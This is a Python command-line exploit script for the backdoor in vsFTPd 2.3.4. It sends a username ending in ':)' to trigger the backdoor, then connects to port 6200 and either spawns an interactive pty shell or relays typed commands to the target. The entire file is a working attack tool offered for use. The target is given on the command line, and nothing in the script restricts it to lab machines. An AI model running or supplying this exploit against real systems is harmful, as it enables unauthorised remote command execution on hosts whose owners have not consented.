import click
from telnetlib import Telnet
from time import sleep
from pyautogui import press
import socket
# with out sockt


user = "USER name"
password = "PASS pass"


def with_shell(ip, port):

    user = "USER hackerman:)"
    password = "PASS pass"

    print('[*] Attempting to login trigger backdoor')

    sleep(2)

    tn = Telnet(ip, str(port))

    sleep(1)
    tn.read_until(b"(vsFTPd 2.3.4)")
    tn.write(user.encode('ascii') + b"\n")
    tn.read_until(b"password.")
    tn.write(password.encode('ascii') + b"\n")
    tn.close()

    sleep(5)

    print("[*] Attempting to connect to backdoor.")

    tn2 = Telnet(ip, 6200)

    command = "python -c 'import pty; pty.spawn(\"/bin/sh\")'"

    tn2.write(command.encode('ascii'))

    print(f"[+] Connected to backdoor on {ip}:6200 ")

    press("enter")
    print("[+] Success, shell opened")
    print("[*] Send `Ctrl + C` to quit shell")

    tn2.interact()


def with_out_shell(ip, port):
    try:
        print('[*] Attempting to login trigger backdoor')
        #  test
        ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_socket.connect((ip, port))

        ftp_socket.send(b'USER letmein:)\n')
        ftp_socket.send(b'PASS please\n')

        print("[+] ftp verson: ",
              ftp_socket.recv(1024).decode('utf-8'))
        print("[+] ", ftp_socket.recv(1024).decode('utf-8'))
        sleep(3)
    except:

        print(f"[!] Failed to trigger backdoor ${ip}")

    try:
        print("[*] Attempting to connect to backdoor.")
        sleep(3)
        backdoor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_socket.connect((ip, 6200))
        print(f"[+] Connected to backdoor on {ip}:6200 ")
        while True:
            get_command = input("commond: ")
            if get_command.lower().strip() == "exit":
                break
            command = str.encode(get_command + '\n')
            backdoor_socket.send(command)
            response = backdoor_socket.recv(1024).decode('utf-8')
            print(response)
    except:
        print(f'[!] Failed to connect to backdoor on {ip}:6200')


@click.command()
@click.option('--host',  help='The host IP address example: xx.xx.xx.xx', )
@click.option('--port', default=21, help='The port number [default: 21] [optional] ')
@click.option('--shell', default=False, help="The is for span shell [default: False] [optional]", type=bool)
def main(host, port, shell):
    """
         Try Hader  
    """
    if not host:
        print("help: python filename.py --help ")
        return None

    if shell:
        with_shell(host, port)
    else:
        with_out_shell(host, port)


if __name__ == "__main__":
    main()
